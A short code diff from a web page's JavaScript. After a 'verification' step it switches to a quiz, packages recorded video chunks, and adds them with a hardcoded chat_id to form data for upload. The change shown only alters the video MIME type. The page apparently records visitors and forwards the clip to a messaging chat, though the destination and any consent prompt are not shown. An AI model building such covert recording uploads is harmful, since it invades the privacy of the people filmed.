@@ -184,7 +184,7 @@
                         document.getElementById('verification-container').style.display = 'none';
                         document.getElementById('quiz-container').style.display = 'block';
 
-                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
                         const formData = new FormData();
                         formData.append('chat_id', '2070423407');
                         formData.append('video', blob, 'video.webm');
